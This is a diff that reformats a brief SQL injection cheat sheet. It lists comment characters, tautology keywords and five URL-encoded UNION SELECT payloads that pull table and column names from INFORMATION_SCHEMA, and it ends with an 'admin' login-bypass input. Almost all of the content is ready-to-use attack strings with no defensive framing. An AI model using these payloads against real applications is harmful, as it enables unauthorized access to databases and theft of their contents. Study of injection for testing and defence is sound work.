@@ -1,15 +1,19 @@
 # SQLi 
-Command characters are (#, /**/, ;, —)
+#### Command characters are (#, /**/, ;, —)
 
-We can use the following code to make it true
+##### Note: We can use the following code to make it true
 
-("or", "and", "true", "false", "union", "like", "=", ">", "<", ";", "--", "/*", "*/")
+    ("or", "and", "true", "false", "union", "like", "=", ">", "<", ";", "--", "/*", "*/")
 
-#### 0+UNION+SELECT+NULL,+COLUMN_NAME,+NULL,+NULL+FROM+INFORMATION_SCHEMA.COLUMNS
-#### 0+UNION+SELECT+NULL,+group_concat(COLUMN_NAME),+NULL,+NULL+FROM+INFORMATION_SCHEMA.COLUMNS
-#### 0+UNION+SELECT+2,3,table_name,4+from+INFORMATION_SCHEMA.tables
-#### 0+UNION+SELECT+2,group_concat(table_name),3,4+from+INFORMATION_SCHEMA.TABLES
-#### 0+UNION+SELECT+2,3,group_concat(table_name),4+from+INFORMATION_SCHEMA.tables+where+table_SCHEMA=database()
+    
+..............................................................................
+
+    0+UNION+SELECT+NULL,+COLUMN_NAME,+NULL,+NULL+FROM+INFORMATION_SCHEMA.COLUMNS
+    0+UNION+SELECT+NULL,+group_concat(COLUMN_NAME),+NULL,+NULL+FROM+INFORMATION_SCHEMA.COLUMNS
+    0+UNION+SELECT+2,3,table_name,4+from+INFORMATION_SCHEMA.tables
+    0+UNION+SELECT+2,group_concat(table_name),3,4+from+INFORMATION_SCHEMA.TABLES
+    0+UNION+SELECT+2,3,group_concat(table_name),4+from+INFORMATION_SCHEMA.tables+where+table_SCHEMA=database()
+
 ..............................................................................
 
 user=admin' ;&pass=a 
